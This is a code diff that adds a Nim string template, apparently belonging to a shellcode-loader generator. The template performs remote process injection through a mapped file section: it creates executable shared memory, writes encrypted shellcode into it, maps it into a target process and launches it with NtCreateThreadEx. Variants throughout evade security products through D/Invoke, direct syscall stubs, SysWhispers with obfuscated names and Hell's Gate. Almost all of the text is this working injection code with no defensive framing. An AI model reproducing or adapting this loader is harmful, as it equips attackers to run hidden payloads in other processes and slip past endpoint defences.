@@ -1,3 +1,176 @@
+let ShellcodeRemoteInjectMapSection * = """
+
+    when defined(DInvoke):
+        let tProcess2 = MyGetCurrentProcessId()
+        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    else:
+        let tProcess2 = GetCurrentProcessId()
+        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+    var 
+        oldProtection: DWORD = 0
+        status: NTSTATUS
+        success: BOOL
+    
+    when defined(GetSyscallStub):
+    
+        when defined(DInvoke):
+            MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+            let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        else:
+            let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+    
+        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+        var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+        # define NtOpenProcess
+        var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
+        VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+        # define NtWriteVirtualMemory
+        let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
+        VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+        # define NtCreateThreadEx
+        let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
+        VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+        success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
+        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+        success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
+    when defined(SysWhispers):
+        status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), status
+
+        var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
+
+        if (hMapFile == 0):
+            echo obf("[-] Failed to create file mapping")
+            echo GetLastError()
+        
+        proc MapViewOfFile3(
+            FileMapping: HANDLE,
+            Process: HANDLE,
+            BaseAddress: PVOID,
+            Offset: ULONG,
+            ViewSize: SIZE_T,
+            AllocationType: ULONG ,
+            PageProtection: ULONG,
+            ExtendedParameters: PVOID,
+            ParameterCount: ULONG
+        ): LPVOID {.stdcall, dynlib: "kernelbase.dll", importc: "MapViewOfFile3", discardable.}
+
+        var lpMapAddress: LPVOID = MapViewOfFile3(hMapFile, GetCurrentProcess(), nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+        if (lpMapAddress == nil):
+            echo obf("[-] Failed to map view of file")
+            echo GetLastError()
+
+        
+        var bytesWritten: SIZE_T
+
+        status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
+
+        when defined(verbose):
+            echo obf("[*] NtWriteVirtualMemory: "), status
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
+        var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+        if (lpMapAddressRemote == nil):
+            echo obf("[-] Failed to map view of file remote")
+            echo GetLastError()
+        when defined(sleepinbetween):
+            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+        ptrEncText = cast[ptr byte](lpMapAddress)
+        ptrDecText = cast[ptr byte](lpMapAddress)
+        decryptlate()
+        
+        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)
+
+        status = zuatzuastdiasyy(tHandle)
+        status = zuatzuastdiasyy(pHandle)
+
+        when defined(verbose):
+            echo success
+    else:
+        when defined(Hellsgate):
+            if getSyscall(ntOpenTable):
+                syscall = ntOpenTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
+    
+        status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), status
+    
+        when defined(Hellsgate):
+            if getSyscall(ntCreateTable):
+                syscall = ntCreateTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+        var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
+
+        if (hMapFile == 0):
+            echo obf("[-] Failed to create file mapping")
+            echo GetLastError()
+        
+        proc MapViewOfFile3(
+            FileMapping: HANDLE,
+            Process: HANDLE,
+            BaseAddress: PVOID,
+            Offset: ULONG,
+            ViewSize: SIZE_T,
+            AllocationType: ULONG ,
+            PageProtection: ULONG,
+            ExtendedParameters: PVOID,
+            ParameterCount: ULONG
+        ): LPVOID {.stdcall, dynlib: "kernelbase.dll", importc: "MapViewOfFile3", discardable.}
+
+        var lpMapAddress: LPVOID = MapViewOfFile3(hMapFile, GetCurrentProcess(), nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+        if (lpMapAddress == nil):
+            echo obf("[-] Failed to map view of file")
+            echo GetLastError()
+
+        when defined(Hellsgate):
+            if getSyscall(ntWriteTable):
+                syscall = ntWriteTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+        var bytesWritten: SIZE_T
+        status = NtWriteVirtualMemory(
+            pHandle2, 
+            lpMapAddress, 
+            unsafeAddr friendlycode, 
+            sc_size, 
+            addr bytesWritten)
+
+        var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
+        if (lpMapAddressRemote == nil):
+            echo obf("[-] Failed to map view of file remote")
+            echo GetLastError()
+        when defined(sleepinbetween):
+            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
+        ptrEncText = cast[ptr byte](lpMapAddress)
+        ptrDecText = cast[ptr byte](lpMapAddress)
+        decryptlate()
+        status = NtCreateThreadEx(
+            &tHandle, 
+            THREAD_ALL_ACCESS, 
+            NULL, 
+            pHandle,
+            lpMapAddressRemote, 
+            NULL, FALSE, 0, 0, 0, NULL)
+
+when isMainModule:
+     injectCreateRemoteThread(enctext) 
+
+"""
+
+
 let ShellcoderemoteinjectStub * = """
     
     when defined(DInvoke):
